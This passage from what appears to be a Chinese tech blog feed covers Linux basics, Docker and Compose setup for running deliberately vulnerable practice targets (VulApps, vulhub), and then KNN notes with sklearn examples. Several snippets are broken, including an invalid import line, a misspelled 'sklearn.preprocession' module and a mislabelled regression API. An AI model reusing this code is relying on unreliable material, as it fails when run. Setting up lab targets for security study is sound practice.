文件系统的信息。</li><li><code>/tmp</code>：存放一些临时文件的。</li><li><code>/usr</code>：用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</li><li><code>/var</code>：存放着在不断扩充着的东西，习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</li><li><code>/run</code>：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。</li></ul><p>在Linux文件系统中有两个特殊的目录，一个是当前所在的工作目录，也叫当前目录，可以使用一个点<code>.</code>来表示；另一个是当前目录的上一级目录，也叫父目录，可以使用两个点<code>..</code>来表示。如果一个目录或文件名以一个点<code>.</code>开始，表示这个目录或文件是一个隐藏目录或文件。</p><h3 id="2-文件基本属性"><a href="#2-文件基本属性" class="headerlink" title="2. 文件基本属性"></a>2. 文件基本属性</h3><p>Linux 系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。为了保护系统的安全性，Linux 系统对不同的用户访问同一文件（包括目录文件）的权限做了不同的规定。在 Linux 中通常使用以下两个命令来修改文件或目录的所属用户与权限：</p><ul><li><code>chown</code> (change owner)：修改所属用户与组。</li><li><code>chmod</code> (change mode)：修改用户的权限。</li></ul><p>通过执行<code>ls -l</code>或者<code>ll</code>命令来显示一个文件的属性以及文件所属的用户和组。参数解释如下：</p><ul><li>第一列：表示文件的权限。</li><li>第二列：如果是文件，表示硬链接数，如果是目录表示该目录的子目录个数。</li><li>第三列：表示文件的属主。</li><li>第四列：表示文件属于哪个组。</li><li>第五列：表示文件的大小，如果是目录，则统一为4096。</li><li>第六列：文件上一次修改的时间。</li><li>第七列：文件名。</li></ul><p>更改文件属性的方法如下：</p><ul><li>更改文件属主：<code>chown [–R] 属主名 文件名</code> 或 <code>chown [-R] 属主名:属组名 文件名</code></li><li>更改文件权限：<code>chmod 权限 文件名</code> 或 <code>chmod [-R] 权限 文件名</code></li></ul><p>文件的权限字符为<code>-rwxrwxrwx</code>，这九个权限是三个三个一组的。其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下：r&#x3D;4，w&#x3D;2，x&#x3D;1。每种身份(owner&#x2F;group&#x2F;others)各自的三个权限(r&#x2F;w&#x2F;x)分数是需要累加的。</p><h3 id="3-文件目录管理"><a href="#3-文件目录管理" class="headerlink" title="3. 文件目录管理"></a>3. 文件目录管理</h3><p>绝对路径：路径的写法，由根目录<code>/</code>写起，例如：<code>/usr/share/doc</code>这个目录。<br>相对路径：路径的写法，不是由<code>/</code>写起，例如由<code>/usr/share/doc</code>要到<code>/usr/share/man</code>底下时，可以写成：<code>cd ../man</code>。</p><h4 id="1-目录管理"><a href="#1-目录管理" class="headerlink" title="(1) 目录管理"></a>(1) 目录管理</h4><p>常用的目录管理命令如下：</p><ul><li><code>chown</code>：修改文件或目录的所属用户。</li><li><code>chmod</code>：修改文件或目录的权限。</li><li><code>mkdir</code>：创建一个新的目录。</li><li><code>rmdir</code>：删除一个空的目录。</li></ul><h4 id="2-文件查看"><a href="#2-文件查看" class="headerlink" title="(2) 文件查看"></a>(2) 文件查看</h4><p>常用的文件查看命令如下：</p><ul><li><code>ls</code>：列出目录及文件名。</li><li><code>pwd</code>：显示目前的目录。</li><li><code>cat</code>：由第一行开始显示文件内容。</li><li><code>tac</code>：从最后一行开始显示。</li><li><code>nl</code>：显示的时候，顺道输出行号。</li><li><code>more</code>：一页一页的显示文件内容。</li><li><code>less</code>：与<code>more</code>类似，但可以往前翻页。</li><li><code>head</code>：只看头几行。</li><li><code>tail</code>：只看尾巴几行。</li></ul><h3 id="4-文件编辑"><a href="#4-文件编辑" class="headerlink" title="4. 文件编辑"></a>4. 文件编辑</h3><p>所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在。目前使用比较多的是 vim 编辑器。Vim 是从 vi 发展出来的一个文本编辑器。代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。</p><h4 id="vi-vim使用"><a href="#vi-vim使用" class="headerlink" title="vi&#x2F;vim使用"></a>vi&#x2F;vim使用</h4><p>vi&#x2F;vim共分为三种模式，分别是：命令模式（Command mode）、输入模式（Insert mode）和底线命令模式（Last line mode）。</p><ul><li>命令模式：使用vi&#x2F;vim打开文件时进入命令模式，此时敲击键盘，被敲击的字符不会被当成内容写入到文件里，而是被当成了命令。如果想要向文件里写入内容，则需要先进入输入模式。</li><li>输入模式：按下<code>i</code>、<code>a</code>、<code>o</code>（<code>I</code>、<code>A</code>、<code>O</code>）其中的一个键则进入到输入模式，可以看到<code>INSERT</code>。在输入模式下可以直接输入想写入的内容，如果要改变输入的位置，可以使用上下左右方向键。</li><li>底线命令模式：在命令行模式下按下<code>:</code>（英文冒号）进入底线命令模式。在底线命令模式下常用的命令有：保存文件并退出，则输入<code>wq</code>或者<code>x</code>；退出程序（如果程序编辑过是无法退出的）则输入<code>q</code>；保存文件则输入<code>w</code>。</li></ul><h3 id="5-apt包管理器"><a href="#5-apt包管理器" class="headerlink" title="5. apt包管理器"></a>5. apt包管理器</h3><p>apt（Advanced Packaging Tool）是一个在 Debian 和 Ubuntu 中的 Shell 前端软件包管理器。apt 命令提供了查找、安装、升级、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。apt 命令执行需要超级管理员权限(root)。</p><h4 id="（1）-语法"><a href="#（1）-语法" class="headerlink" title="（1） 语法"></a>（1） 语法</h4><p><code>apt [options] [command] [package ...]</code></p><p>其中，<code>options</code>是可选的，选项包括 <code>-h</code>（帮助），<code>-y</code>（当安装过程提示选择全部为”yes”），<code>-q</code>（不显示安装的过程）等等；<code>command</code>是要进行的操作；<code>package</code>是安装的包名。例如，安装vim，则执行指令<code>apt -y install vim</code>。</p><h4 id="（2）-换源"><a href="#（2）-换源" class="headerlink" title="（2） 换源"></a>（2） 换源</h4><p>apt下载软件默认从国外下载，所以会非常的缓慢甚至超时，此时可以先更换apt源。源文件地址为<code>/etc/apt/sources.list</code>，为了以后可能还会用到，所以可以先备份源文件。然后编辑源文件，将文件内容全部清空，在命令模式下输入<code>51dd</code>即可将光标之后的51行全部删除掉。然后进入输入模式，将下方内容全部复制粘贴进源文件里，然后保存退出。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>更新源（更新本地包缓存，这样的话你的系统就知道有哪些包的版本是可用的），输入<code>sudo apt update</code>。</p><h3 id="6-其它常用指令"><a href="#6-其它常用指令" class="headerlink" title="6. 其它常用指令"></a>6. 其它常用指令</h3><ul><li>重启：<code>reboot</code></li><li>关机：<code>shutdown -h now</code></li><li>查看网络接口信息：<code>ifconfig</code>（如果出现无法使用的情况，则需要先安装<code>net-tools</code>）</li><li>查看端口信息：<code>netstat -antlp</code></li></ul><h2 id="二、Docker"><a href="#二、Docker" class="headerlink" title="二、Docker"></a>二、Docker</h2><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux机器或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。Docker 有三个基本概念，Docker镜像(Images)、Docker容器(Container)、Docker仓库(Registry)。</p><h3 id="（1）-安装"><a href="#（1）-安装" class="headerlink" title="（1） 安装"></a>（1） 安装</h3><p>安装 apt 依赖包，用于通过HTTPS来获取仓库：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><p>添加 Docker 的官方 GPG 密钥：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | <span class="built_in">sudo</span> apt-key add -</span><br></pre></td></tr></table></figure><p>设置稳定版仓库：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository <span class="string">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><p>更新 apt 包索引：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure><p>安装最新版本的 Docker Engine-Community 和 containerd ：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>测试是否安装完成：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker --version</span><br></pre></td></tr></table></figure><p>设置开机自启动：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker.service</span><br></pre></td></tr></table></figure><h3 id="（2）-设置加速器"><a href="#（2）-设置加速器" class="headerlink" title="（2） 设置加速器"></a>（2） 设置加速器</h3><p>国内从 DockerHub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker 官方和国内很多云服务商都提供了国内加速器服务，例如：科大镜像、网易、阿里云、七牛云加速器等。编辑<code>/etc/docker/daemon.json</code>，添加以下内容：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;https://dockerhub.azk8s.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://reg-mirror.qiniu.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://1rqfztnd.mirror.aliyuncs.com&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后重载配置文件并重启docker：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure><p>执行<code>sudo docker info</code>可以看到加速器已经成功设置。</p><h3 id="（3）-利用docker运行靶场"><a href="#（3）-利用docker运行靶场" class="headerlink" title="（3） 利用docker运行靶场"></a>（3） 利用docker运行靶场</h3><p>这里使用vulapps靶场，该靶场包含了各种应用、框架的漏洞。靶场地址：<a href="https://github.com/Medicean/VulApps">Medicean&#x2F;VulApps</a>。</p><ul><li>拉取镜像：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull medicean/vulapps:c_cmseasy_1</span><br></pre></td></tr></table></figure><ul><li>启动环境：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -p 8000:80 medicean/vulapps:c_cmseasy_1</span><br></pre></td></tr></table></figure><ul><li>访问靶场：<br>通过浏览器访问<code>http://虚拟机ip:容器映射出来的端口/</code>，例如<code>http://192.168.186.132:8000/</code>。</li></ul><h3 id="（4）-其它指令介绍"><a href="#（4）-其它指令介绍" class="headerlink" title="（4） 其它指令介绍"></a>（4） 其它指令介绍</h3><ul><li>查看所有本地镜像：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><ul><li>删除镜像：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像ID</span><br></pre></td></tr></table></figure><ul><li>查看所有容器：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><ul><li>查看正在运行的容器：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><ul><li>停止容器：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop 容器ID</span><br></pre></td></tr></table></figure><ul><li>删除容器：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br></pre></td></tr></table></figure><ul><li>启动停止的容器：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure><h2 id="三、Docker-compose"><a href="#三、Docker-compose" class="headerlink" title="三、Docker-compose"></a>三、Docker-compose</h2><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p><h3 id="（1）-安装-1"><a href="#（1）-安装-1" class="headerlink" title="（1） 安装"></a>（1） 安装</h3><p>通过执行下面的命令，高速安装 Docker Compose：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>将可执行权限应用于二进制文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>创建软链：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p>测试是否安装成功，出现版本信息说明成功：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker-compose --version</span><br></pre></td></tr></table></figure><h3 id="（2）-利用docker-compose运行靶场"><a href="#（2）-利用docker-compose运行靶场" class="headerlink" title="（2） 利用docker-compose运行靶场"></a>（2） 利用docker-compose运行靶场</h3><p>这里使用vulhub靶场，该靶场包含了各种应用、框架的漏洞。靶场地址：<a href="https://github.com/vulhub/vulhub">vulhub&#x2F;vulhub</a>。</p><ul><li>将该靶场文件下载到虚拟机里，然后进入到对应的文件夹，直到可以看到<code>docker-compose.yml</code>文件。</li><li>执行以下命令拉取镜像并运行容器：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker-compose up -d</span><br></pre></td></tr></table></figure><ul><li>访问靶场：访问方式可在文件夹里的<code>README.md</code>查看。</li><li>停止靶场：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker-compose down</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KNN算法</title>
      <link href="/2025/04/19/KNN%E7%AE%97%E6%B3%95/"/>
      <url>/2025/04/19/KNN%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="KNN算法"><a href="#KNN算法" class="headerlink" title="KNN算法"></a>KNN算法</h1><h2 id="KNN算法简介"><a href="#KNN算法简介" class="headerlink" title="KNN算法简介"></a>KNN算法简介</h2><h3 id="KNN算法思想"><a href="#KNN算法思想" class="headerlink" title="KNN算法思想"></a>KNN算法思想</h3><ul><li><p><strong>K-近邻算法</strong>（K Nearest Neighbor，简称KNN）。</p><ul><li>根据你的“<strong>邻居</strong>”来<strong>推断</strong>出你的类别</li><li>如果一个样本在<strong>特征空间中</strong>的 <strong>k 个最相似</strong>的样本中的大多数<strong>属于某一个类别</strong>，则该样本也属于这个类别</li></ul></li><li><p><strong>样本相似性</strong>：样本都是属于一个任务数据集的。样本<strong>距离越近</strong>则<strong>越相似</strong>。</p></li></ul><p>利用K近邻算法预测电影类型</p><style>.rzjfwmxyckis{zoom:80%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831143341119-1747654339826-1.png" class="rzjfwmxyckis" alt="image-20230831143341119"><style>.yzfnwaxkubsf{zoom:80%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831143403932-1747654361076-3.png" class="yzfnwaxkubsf" alt="image-20230831143403932"><ul><li>二维平面上点a(x1, y1)与(x2, y2)间的欧氏距离：</li></ul><style>.jrrtofcsdqnm{zoom:80%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831143436328-1747654491160-5.png" class="jrrtofcsdqnm" alt="image-20230831143436328"><ul><li>三维平面上点a(x1, y1, z1)与(x2, y2, z2)间的欧氏距离：</li></ul><img src="./KNN算法/image-20230831143430741-1747654622814-7.png" alt="image-20230831143430741" style="zoom:80%;" /><ul><li>n维平面上点a(x11,x12, …… , x1n)与(x21, x22, …… ,x2n)间的欧氏距离：</li></ul><img src="./KNN算法/image-20230831143416184-1747654641667-9.png" alt="image-20230831143416184" style="zoom:80%;" /><h3 id="K值的选择"><a href="#K值的选择" class="headerlink" title="K值的选择"></a>K值的选择</h3><ul><li><p>K值过小：用<strong>较小邻域</strong>中的训练实例进行预测，容易受到<strong>异常点</strong>的影响，K值的减小就意味着<strong>整体模型变得复杂</strong>，容易发生<strong>过拟合</strong></p><blockquote><p>K值过小需要<strong>频繁调整决策边界</strong>以适应局部数据波动。这会显著<strong>增加模型的复杂度</strong>，使决策边界呈现不规则的锯齿状，最终导致<strong>过拟合</strong>（训练误差低但测试误差高）</p><ul><li><p>关于频繁调整决策边界：当K值过小时（如K&#x3D;1），模型仅依赖<strong>单个或极少数邻近样本</strong>进行预测。此时，决策边界会围绕每个训练样本的局部位置形成细碎的“锯齿状”结构。例如：</p><ul><li><strong>新增一个异常点</strong>：该点的位置会直接扭曲其邻近区域的决策边界，迫使边界围绕异常点重新划分（如原本属于类别A的区域被异常点划入类别B）</li><li><strong>样本分布不均匀</strong>：在稀疏区域，少量样本的微小位置变化会导致边界剧烈波动，模型需要不断调整以匹配这些局部特征</li></ul></li><li><p>关于模型变得复杂：</p><ul><li><strong>特征空间分割过细</strong><br>小K值要求模型在特征空间中为每个样本划分独立的“势力范围”。当样本量增加时，这些细碎的分区需要频繁调整以容纳新样本，边界重构的计算量急剧上升</li><li><strong>对噪声的敏感反馈</strong><br>噪声或标注错误的样本会生成<strong>伪局部模式</strong>。例如，一个误标为“猫”的狗图片（噪声），在K&#x3D;1时会形成一个以该样本为中心的猫类区域，迫使决策边界绕行该区域，形成非真实的分类结构</li></ul></li></ul></blockquote></li><li><p>K值过大：用<strong>较大邻域</strong>中的训练实例进行预测，受到<strong>样本均衡</strong>的问题，且K值的增大就意味着整体的模型<strong>变得简单，使得分类边界不明显，欠拟合</strong></p><blockquote><p>K值过大：实质是通过<strong>平滑决策边界</strong>降低模型复杂度，但极端情况（如K&#x3D;N）会退化为简单多数投票模型，完全忽略特征空间中的局部信息，<strong>使得分类界限不明显</strong>，导致<strong>欠拟合</strong>（训练误差和测试误差均较高）。此时<strong>近似误差增大</strong>，模型无法捕捉数据细节</p><ul><li>模型容易偏向<strong>数量占优的类别</strong>（如猫狗分类数据集中狗样本占80%，大K值可能将所有预测结果偏向狗类）</li><li>极端情况K&#x3D;N（N为样本总数）会直接预测数量<strong>最多的类别</strong>，完全忽略特征空间信息</li></ul><blockquote><p><strong>平滑决策边界的概念</strong></p><p><strong>平滑决策边界</strong>指模型通过综合考虑样本的全局或局部分布规律，形成的连续、规则且波动较小的分类分界线。其核心目标是<strong>减少噪声干扰</strong>并提升模型的<strong>泛化能力</strong>，避免因过度拟合局部细节而产生锯齿状或不规则边界。</p></blockquote></blockquote></li></ul><h3 id="KNN的应用方式"><a href="#KNN的应用方式" class="headerlink" title="KNN的应用方式"></a>KNN的应用方式</h3><ul><li><p>解决问题：分类问题、回归问题</p></li><li><p>算法思想：若一个样本在特征空间中的 k 个<strong>最相似的</strong>样本大多数属于某一个类别，则该样本<strong>也属于这个类别</strong></p></li><li><p>相似性：<strong>欧氏距离</strong></p></li><li><p><strong>分类问题</strong>的处理流程：</p><ul><li><ol><li>计算未知<strong>样本</strong>到<strong>每一个训练样本</strong>的距离</li></ol></li><li><ol start="2"><li>将训练样本根据距离大小<strong>升序排列</strong></li></ol></li><li><ol start="3"><li>取出<strong>距离最近的 K 个</strong>训练样本</li></ol></li><li><ol start="4"><li>进行<strong>多数表决</strong>，统计 K 个样本中哪个类别的样本个数最多</li></ol></li><li><ol start="5"><li>将未知的样本<strong>归属到</strong>出现<strong>次数最多</strong>的类别</li></ol></li></ul></li><li><p><strong>回归问题</strong>的处理流程：</p><ul><li><ol><li>计算未知<strong>样本</strong>到<strong>每一个训练样本</strong>的距离</li></ol></li><li><ol start="2"><li>将训练样本根据距离大小<strong>升序排列</strong></li></ol></li><li><ol start="3"><li>取出<strong>距离最近的 K 个</strong>训练样本</li></ol></li><li><ol start="4"><li>把这个 K 个样本的目标值<strong>计算其平均值</strong></li></ol></li><li><ol start="5"><li>将上述平均值作为将<strong>未知的样本预测的值</strong></li></ol></li></ul></li></ul><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="分类API"><a href="#分类API" class="headerlink" title="分类API"></a>分类API</h3><p>KNN分类API：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.neighbors.KNeighborsClassifier(n_neighbors=<span class="number">5</span>) </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Sklearn.neighbor <span class="keyword">import</span> KNeighborClassifier(n_neighbors = <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据（特征工程）</span></span><br><span class="line">x = [</span><br><span class="line">    [<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">]</span><br><span class="line">y = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化模型</span></span><br><span class="line">model = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型训练</span></span><br><span class="line">model.fit(x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型预测</span></span><br><span class="line"><span class="built_in">print</span>(model.predict([[<span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>]]))</span><br></pre></td></tr></table></figure><p>n_neighbors：int,可选（默认&#x3D; 5），k_neighbors查询默认使用的邻居数</p><h3 id="回归API"><a href="#回归API" class="headerlink" title="回归API"></a>回归API</h3><p>KNN分类API：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sklearn.neighbors.KNeighborsRegressor(n_neighbors=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier,KNeighborsRegressor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据(特征工程)</span></span><br><span class="line">x = [</span><br><span class="line">    [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">    [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line">    [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],</span><br><span class="line">]</span><br><span class="line">y = [<span class="number">0.1</span>,<span class="number">0.2</span>,<span class="number">0.3</span>,<span class="number">0.4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.实例化</span></span><br><span class="line">model = KNeighborsRegressor(n_neighbors=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.训练</span></span><br><span class="line">model.fit(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.预测</span></span><br><span class="line"><span class="built_in">print</span>(model.predict([[<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>]]))</span><br></pre></td></tr></table></figure><h2 id="距离度量方法"><a href="#距离度量方法" class="headerlink" title="距离度量方法"></a>距离度量方法</h2><h3 id="欧式距离"><a href="#欧式距离" class="headerlink" title="欧式距离"></a>欧式距离</h3><p><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831153948263-1747654680288-11.png" alt="image-20230831153948263"></p><h3 id="曼哈顿距离"><a href="#曼哈顿距离" class="headerlink" title="曼哈顿距离"></a>曼哈顿距离</h3><p><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831154005301-1747654702676-13.png" alt="image-20230831154005301"></p><h3 id="切比雪夫距离"><a href="#切比雪夫距离" class="headerlink" title="切比雪夫距离"></a>切比雪夫距离</h3><p><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831154033908-1747654718135-15.png" alt="image-20230831154033908"></p><p><strong>绝对差 最大值</strong></p><h3 id="闵氏距离"><a href="#闵氏距离" class="headerlink" title="闵氏距离"></a>闵氏距离</h3><p>闵可夫斯基距离，不是一种新的距离的度量方式。而是<strong>距离的组合</strong>，是对多个距离度量公式的<strong>概括性的表述</strong></p><p><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831154217579-1747654733524-17.png" alt="image-20230831154217579"></p><h2 id="特征预处理"><a href="#特征预处理" class="headerlink" title="特征预处理"></a>特征预处理</h2><h3 id="为什么进行归一化、标准化"><a href="#为什么进行归一化、标准化" class="headerlink" title="为什么进行归一化、标准化"></a>为什么进行归一化、标准化</h3><p>特征的<strong>单位或者大小相差较大，或者某特征的方差相比其他的特征要大出几个数量级</strong>，<strong>容易影响（支配）目标结果</strong>，使得一些模型（算法）无法学习到其它的特征。</p><style>.takigaminfey{zoom:80%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831155159883-1747654745039-19.png" class="takigaminfey" alt="image-20230831155159883"><h3 id="归一化"><a href="#归一化" class="headerlink" title="归一化"></a>归一化</h3><p>通过对原始数据进行变换把数据映射到【mi,mx】(默认为[0,1])之间</p><p><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831155813699-1747654771671-21.png" alt="image-20230831155813699"></p><p>数据归一化的API实现</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocession <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm01_MinMaxScaler</span>():</span><br><span class="line">    <span class="comment"># 1.准备数据</span></span><br><span class="line">    raw_data = [</span><br><span class="line">        [<span class="number">90</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">40</span>],</span><br><span class="line">    [<span class="number">60</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">45</span>],</span><br><span class="line">    [<span class="number">75</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">46</span>],</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2.初始归一化对象</span></span><br><span class="line">    transformer = MinMaxScaler()<span class="comment">#（01）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3.对原始特征进行变换</span></span><br><span class="line">    data = transformer.fit_transform(raw_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4.打印归一化后的结果</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>归一化受到最大值与最小值的影响，这种方法<strong>容易受</strong>到异常数据的影响, <strong>鲁棒性较差</strong>，适合传统<strong>精确小数据</strong>场景</p><h3 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h3><p>通过对原始数据进行标准化，转换为<strong>均值为0</strong>，<strong>标准差为1</strong>的标准正态分布的数据</p><style>.tmfiygemrxnm{zoom:50%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831160053298-1747654791663-23.png" class="tmfiygemrxnm" alt="image-20230831160053298"><ul><li>mean 为特征的平均值</li><li>σ 为特征的标准差</li></ul><p>数据标准化的API实现</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm03_StandardScaler</span>():</span><br><span class="line">    <span class="comment"># 1.准备数据</span></span><br><span class="line">    raw_data = [</span><br><span class="line">        [<span class="number">90</span>, <span class="number">2</span>, <span 